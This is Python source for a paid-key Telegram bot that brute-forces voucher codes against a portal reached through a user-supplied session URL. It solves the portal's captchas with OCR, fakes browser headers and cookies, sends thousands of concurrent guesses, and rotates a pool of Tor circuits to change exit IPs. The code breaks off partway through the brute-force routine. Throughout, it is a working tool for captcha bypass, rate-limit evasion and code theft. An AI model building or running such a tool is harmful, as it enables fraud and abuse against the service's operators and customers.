import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = ''
GITHUB_TOKEN = ''
REPO_OWNER = ""
REPO_NAME = ""
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}
session = None
_connector = None
_tor_connectors = []
_tor_processes = []
_tor_rr = 0
TOR_POOL_SIZE = 5
CONCURRENCY = 3000
_voucher_sem = None
_start_time = time.monotonic()
proxy_enabled = False
_auto_rotate_task = None
AUTO_ROTATE_INTERVAL = 360

async def auto_rotate_loop():
    while proxy_enabled and _tor_processes:
        await asyncio.sleep(AUTO_ROTATE_INTERVAL)
        if not proxy_enabled:
            break
        await rotate_tor()
        print(f"[auto-rotate] Rotated all {len(_tor_processes)} Tor circuits")

def _start_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = asyncio.create_task(auto_rotate_loop())

def _stop_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = None

def _next_tor_connector():
    global _tor_rr
    if not _tor_connectors:
        return _connector
    c = _tor_connectors[_tor_rr % len(_tor_connectors)]
    _tor_rr = (_tor_rr + 1) % len(_tor_connectors)
    return c

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session(use_proxy=False, socks_ports=None):
    global session, _connector, _tor_connectors
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    for c in _tor_connectors:
        if not c.closed:
            await c.close()
    _tor_connectors.clear()
    timeout = aiohttp.ClientTimeout(total=30)
    if use_proxy and socks_ports:
        _tor_connectors.extend(
            ProxyConnector.from_url(
                f'socks5://127.0.0.1:{p}',
                rdns=True, limit=2000, ssl=False
            )
            for p in socks_ports
        )
        _connector = _tor_connectors[0]
    else:
        _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def _drain_stdout(proc, idx):
    if proc and proc.stdout:
        try:
            async for _ in proc.stdout:
                pass
        except Exception:
            pass

async def _start_one_tor(i):
    socks_port = 9050 + i * 2
    ctrl_port  = 9051 + i * 2
    data_dir   = f"/tmp/tor_bot_{i}"
    os.makedirs(data_dir, exist_ok=True)
    torrc = (
        f"SocksPort {socks_port}\n"
        f"ControlPort {ctrl_port}\n"
        f"DataDirectory {data_dir}\n"
        "CookieAuthentication 0\n"
        "Log notice stdout\n"
        "MaxCircuitDirtiness 10\n"
    )
    torrc_path = f"/tmp/torrc_bot_{i}"
    with open(torrc_path, "w") as f:
        f.write(torrc)
    proc = await asyncio.create_subprocess_exec(
        'tor', '-f', torrc_path,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )
    print(f"[tor-{i}] Starting on socks={socks_port} ctrl={ctrl_port}...")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=10)
        except asyncio.TimeoutError:
            continue
        if not line:
            print(f"[tor-{i}] process ended unexpectedly")
            return None
        line_str = line.decode(errors='replace').strip()
        print(f"[tor-{i}] {line_str}")
        if "Bootstrapped 100%" in line_str:
            print(f"[tor-{i}] Bootstrapped successfully on port {socks_port}")
            asyncio.create_task(_drain_stdout(proc, i))
            return proc
    print(f"[tor-{i}] Bootstrap timed out")
    return None

async def _kill_all_tor():
    for p in _tor_processes:
        try:
            if p.returncode is None:
                p.kill()
        except Exception:
            pass
    await asyncio.gather(*[
        p.wait() for p in _tor_processes if p.returncode is None
    ], return_exceptions=True)
    for cmd in [['pkill', '-9', 'tor'], ['pkill', '-9', '-f', 'torrc_bot']]:
        try:
            kp = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await kp.wait()
        except Exception:
            pass
    for i in range(20):
        lock = f"/tmp/tor_bot_{i}/lock"
        try:
            os.remove(lock)
        except FileNotFoundError:
            pass
    await asyncio.sleep(2)

async def start_tor_pool(n=None):
    global _tor_processes
    if n is None:
        n = TOR_POOL_SIZE
    await _kill_all_tor()
    _tor_processes.clear()
    results = await asyncio.gather(*[_start_one_tor(i) for i in range(n)])
    _tor_processes.extend(p for p in results if p is not None)
    print(f"[tor] Pool started: {len(_tor_processes)}/{n} instances up")
    return len(_tor_processes) > 0

async def rotate_tor():
    async def _rotate_one(ctrl_port):
        try:
            _, writer = await asyncio.open_connection('127.0.0.1', ctrl_port)
            writer.write(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
            await writer.drain()
            await asyncio.sleep(0.5)
            writer.close()
            await writer.wait_closed()
            return True
        except Exception as e:
            print(f"[tor] rotate error ctrl={ctrl_port}: {e}")
            return False
    ctrl_ports = [9051 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[_rotate_one(p) for p in ctrl_ports])
    return any(results)

async def get_current_ip():
    try:
        async with session.get('https://api.ipify.org?format=json') as r:
            data = await r.json()
            return data.get('ip', 'unknown')
    except Exception as e:
        print(f"[get_current_ip] {e}")
        return 'unknown'

async def get_ip_via_port(socks_port):
    try:
        conn = ProxyConnector.from_url(
            f'socks5://127.0.0.1:{socks_port}', rdns=True, ssl=False
        )
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as s:
            async with s.get('https://api.ipify.org?format=json') as r:
                data = await r.json()
                return data.get('ip', 'unknown')
    except Exception as e:
        return f'error'

async def get_all_proxy_ips():
    ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[get_ip_via_port(p) for p in ports])
    return list(zip(ports, results))

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    global proxy_enabled
    args = message.text.split()

    # /proxy rotate — rotate all circuits, show all new IPs
    if len(args) > 1 and args[1].lower() == 'rotate':
        if not proxy_enabled:
            await bot.reply_to(message, "❌ Tor proxy မဖွင့်ရသေးပါ။ /proxy <n> ဖြင့်အရင်ဖွင့်ပါ။")
            return
        ok = await rotate_tor()
        if ok:
            await asyncio.sleep(2)
            ip_pairs = await get_all_proxy_ips()
            lines = "\n".join(f"  #{i+1} (:{p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
            await bot.reply_to(message, f"🔄 Rotated {len(_tor_processes)} circuits\n\n🌐 New IPs:\n{lines}")
        else:
            await bot.reply_to(message, "❌ Circuit rotate မအောင်မြင်ပါ။")
        return

    # /proxy — no number, proxy already ON → turn off
    if proxy_enabled and (len(args) < 2 or not args[1].isdigit()):
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False
        ip = await get_current_ip()
        await bot.reply_to(message, f"✅ Tor Proxy ပိတ်ပြီးပါပြီ!\n🌐 Direct IP: {ip}")
        return

    # /proxy <n> — start N instances (or restart with new count)
    count = int(args[1]) if len(args) > 1 and args[1].isdigit() else TOR_POOL_SIZE
    if count < 1 or count > 10:
        await bot.reply_to(message, "❌ Instance count must be between 1 and 10")
        return

    # If already on, shut down first
    if proxy_enabled:
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False

    msg = await bot.reply_to(
        message,
        f"⏳ Starting {count} Tor instance(s) in parallel...\n"
        f"(each bootstraps separately, may take ~2 min)"
    )
    ok = await start_tor_pool(count)
    if not ok:
        await bot.edit_message_text("❌ Tor startup မအောင်မြင်ပါ။", message.chat.id, msg.message_id)
        return

    socks_ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    await rebuild_session(use_proxy=True, socks_ports=socks_ports)
    proxy_enabled = True
    _start_auto_rotate()

    # Fetch IP for every instance simultaneously
    ip_pairs = await get_all_proxy_ips()
    ip_lines = "\n".join(f"  #{i+1} (port {p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
    await bot.edit_message_text(
        f"✅ Tor Proxy Pool Ready!\n"
        f"🔀 Active instances: {len(_tor_processes)}/{count}\n\n"
        f"🌐 Exit IPs — all used simultaneously (round-robin):\n{ip_lines}\n\n"
        f"🔁 Auto-rotate: every 3 min (all IPs change automatically)\n"
        f"🔄 Manual rotate: /proxy rotate\n"
        f"🔴 Turn off: /proxy",
        message.chat.id, msg.message_id
    )

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        valid = check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(
                message,
                " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
            )
        else:
            approve[message.chat.id] = False
            await bot.reply_to(
                message,
                " Key Expired ဖြစ်နေပါသည်။"
            )
    else:
        await bot.reply_to(
            message,
            " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
        )

ADMIN_ID = "8200954758"

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        await bot.reply_to(
            message,
            f" Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) in auth_list:
        results, _ = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) in auth_list:
        results, sha = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            if message.chat.id not in user_data:
                await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
                return
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            codes = results[chat_id_str]
            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for code in codes:
                recode = await perform_check(
                    session_url_recheck,
                    code,
                    chat_id,
                    scan_id=None,
                    recheck=True,
                    message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
            await save_rechecked_codes(chat_id_str, recheck_list, sha)
        else:
            await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            print(f"[check_session_url] final_url={final_url} status={response.status}")
            if "sessionId" in final_url or "sessionId" in body:
                return True
            if response.status in (200, 302, 301):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/input your_session_url"
        )
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    chat_id = message.chat.id
    if chat_id not in user_data:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
        )
        return

    progress_msg = await bot.send_message(
        chat_id,
        "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "checked": 0,
        "total": None,
        "speed": 0,
        "found": 0,
        "retries": 0,
        "start_time": time.monotonic(),
        "mode": None,
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['setconcurrency'])
async def set_concurrency(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global CONCURRENCY
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setconcurrency 1000\nCurrent: {CONCURRENCY}")
        return
    CONCURRENCY = int(args[1])
    await bot.reply_to(message, f"✅ Concurrency set to {CONCURRENCY}")

@bot.message_handler(commands=['setbatch'])
async def set_batch(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global BATCH_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setbatch 1000\nCurrent: {BATCH_SIZE}")
        return
    BATCH_SIZE = int(args[1])
    await bot.reply_to(message, f"✅ Batch size set to {BATCH_SIZE}")

@bot.message_handler(commands=['settorpool'])
async def set_tor_pool(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global TOR_POOL_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit() or int(args[1]) < 1:
        await bot.reply_to(message, f"Usage: /settorpool 5\nCurrent: {TOR_POOL_SIZE} (active: {len(_tor_processes)})")
        return
    TOR_POOL_SIZE = int(args[1])
    await bot.reply_to(
        message,
        f"✅ Tor pool size set to {TOR_POOL_SIZE}\n"
        f"ℹ️ Applies on next /proxy toggle (current active: {len(_tor_processes)})"
    )

@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if not active:
        await bot.reply_to(message, "📭 No active scans running.")
        return
    lines = [f"📡 Live Scan Stats ({len(active)} active)\n"]
    for cid, d in active.items():
        checked = d.get("checked", 0)
        total = d.get("total")
        speed = d.get("speed", 0)
        found = d.get("found", 0)
        retries = d.get("retries", 0)
        mode = d.get("mode", "?")
        elapsed_s = int(time.monotonic() - d.get("start_time", time.monotonic()))
        h, rem = divmod(elapsed_s, 3600)
        m, s = divmod(rem, 60)
        elapsed_str = f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
        if total:
            percent = (checked / total) * 100
            remaining_codes = total - checked
            eta_min = (remaining_codes / speed) if speed > 0 else None
            eta_str = f"{int(eta_min)}m" if eta_min is not None else "Unknown"
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}-digit\n"
                f"📦 Checked: {checked:,}/{total:,} ({percent:.1f}%)\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str} | ETA: {eta_str}\n"
            )
        else:
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}\n"
                f"📦 Checked: {checked:,}\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str}\n"
            )
    await bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

BATCH_SIZE = 5000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    global _voucher_sem
    effective_concurrency = (1000 * max(1, len(_tor_connectors))) if proxy_enabled else CONCURRENCY
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(
                session_url, code, chat_id, scan_id, message=message
            )

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
